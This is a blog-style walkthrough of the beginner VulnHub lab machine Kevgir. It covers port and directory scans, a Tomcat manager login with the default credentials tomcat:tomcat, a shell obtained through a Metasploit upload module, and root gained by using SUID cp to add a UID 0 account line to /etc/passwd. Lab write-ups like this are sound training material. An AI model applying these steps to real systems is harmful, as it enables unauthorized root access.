---
layout: single
tags: vulnhub
title: Kevgir Writeup
date: 2019-12-14
classes: wide
excerpt: Kevgir is a vulnhub machine intended for beginners.
---
# Kevgir Writeup

Kevgir is a vulnhub machine intended for beginners that was created by canyoupwn.me team so that you can train your hacking practices and exploitation.

## Recon
### Nmap scan
```
PORT     STATE SERVICE     VERSION
25/tcp   open  ftp         vsftpd 3.0.2
|_smtp-commands: SMTP: EHLO 530 Please login with USER and PASS.\x0D
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Kevgir VM
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      38084/udp   mountd
|   100005  1,2,3      44281/udp6  mountd
|   100005  1,2,3      46603/tcp   mountd
|   100005  1,2,3      60512/tcp6  mountd
|   100021  1,3,4      35395/tcp6  nlockmgr
|   100021  1,3,4      51380/udp   nlockmgr
|   100021  1,3,4      58884/udp6  nlockmgr
|   100021  1,3,4      60308/tcp   nlockmgr
|   100024  1          38950/tcp   status
|   100024  1          41925/udp6  status
|   100024  1          44488/tcp6  status
|   100024  1          45900/udp   status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
1322/tcp open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 17:32:b4:85:06:20:b6:90:5b:75:1c:6e:fe:0f:f8:e2 (DSA)
|   2048 53:49:03:32:86:0b:15:b8:a5:f1:2b:8e:75:1b:5a:06 (RSA)
|   256 3b:03:cd:29:7b:5e:9f:3b:62:79:ed:dc:82:c7:48:8a (ECDSA)
|_  256 11:99:87:52:15:c8:ae:96:64:73:d6:49:8c:d7:d7:9f (ED25519)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat
8081/tcp open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Joomla! 1.5 - Open Source Content Management
| http-robots.txt: 14 disallowed entries 
| /administrator/ /cache/ /components/ /images/ 
| /includes/ /installation/ /language/ /libraries/ /media/ 
|_/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Welcome to the Frontpage
9000/tcp open  http        Jetty winstone-2.9
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(winstone-2.9)
|_http-title: Dashboard [Jenkins]
Service Info: Host: CANYOUPWNME; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -40m01s, deviation: 1h09m16s, median: -1s
|_nbstat: NetBIOS name: CANYOUPWNME, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 4.1.6-Ubuntu)
|   Computer name: canyoupwnme
|   NetBIOS computer name: CANYOUPWNME\x00
|   Domain name: 
|   FQDN: canyoupwnme
|_  System time: 2019-12-14T00:39:29+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-12-13T22:39:29
|_  start_date: N/A

```
### Website - Port 80
Just shows us the default index of the apache

### Website - Port 8080
In this port we can see that we have a tomcat instance running and has the default index  so without further ado let us do our directory scanning.

#### Tomcat - directory scan:
```
http://kevgir.vuln:8080/%2e%2e//google.com
http://kevgir.vuln:8080/a%5c.Kevgir.ctb
http://kevgir.vuln:8080/a%5c.aspx
http://kevgir.vuln:8080/cmd
http://kevgir.vuln:8080/docs/
http://kevgir.vuln:8080/docs
http://kevgir.vuln:8080/examples/servlets/servlet/CookieExample
http://kevgir.vuln:8080/examples/servlets/servlet/RequestHeaderExample
http://kevgir.vuln:8080/examples
http://kevgir.vuln:8080/examples/servlets/index.html
http://kevgir.vuln:8080/examples/
http://kevgir.vuln:8080/host-manager/html
http://kevgir.vuln:8080/index.html
http://kevgir.vuln:8080/manager/
http://kevgir.vuln:8080/manager/html
http://kevgir.vuln:8080/manager
http://kevgir.vuln:8080/manager/html/
http://kevgir.vuln:8080/META-INF


```
### Initial foothold
Going to the manager greets us a login form that looks like this

![Screenshot_2019-12-15_07-12-54.png](/assets/images/kevgir/3fea52f8.png)

Trying out the default creds 
```
tomcat:s3cret
``` 
didn't work but ```tomcat:tomcat``` does.

![Screenshot_2019-12-15  manager.png](/assets/images/kevgir/89dc04d6.png)
At this point the only thing I have left to do was to get a shell for my initial foothold so I went to msfconsole and used its module ```tomcat_mgr upload``` to gain shell.

![Screenshot_2019-12-15_07-26-19.png](/assets/images/kevgir/884dcddd.png)

### Root

By checking the SUID binaries by using this command ```find / -perm -4000 -type f``` we can see multiple binaries that we can run with root priviledges.
```
/bin/umount
/bin/fusermount
/bin/ping6
/bin/mount
/bin/ping
/bin/su
/bin/cp
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/at
/usr/bin/mtr
/usr/bin/pkexec
```
Since ```cp``` can run with root priviledges we can use that to copy /etc/passwd to the /tmp so that we can edit it. 

![Screenshot_2019-12-15_07-33-11.png](/assets/images/kevgir/f175a4b8.png)

#### The Plan
The plan here was to add an account in /etc/passwd that has the id and groupid of user root and we can do that by following these steps.

1. generate a password through openssl.
```
-> openssl passwd -1 -salt shin test 
-> $1$shin$u5Pr76df2Y.4dizOBFnYU1
```
2. Start editing the file and insert a line like this:
```
shin:$1$shin$u5Pr76df2Y.4dizOBFnYU1:0:0:Shin:/root:/bin/bash
```
3. Copy the file back to /etc
4. su to your username and boom we got root.
#### Rooted

![Screenshot_2019-12-15_07-43-05.png](/assets/images/kevgir/69cf0aa1.png)

#### Additional Information
This is not the only way to root the machine as you can see we have numerous ports open to get initial foothold but this time I chose tomcat because I was much more comfortable with it anways this box is really good for beginners as it teaches you how to get shells from different cms, and it teaches you about SUID too anyways thanks for reading and stay tune. 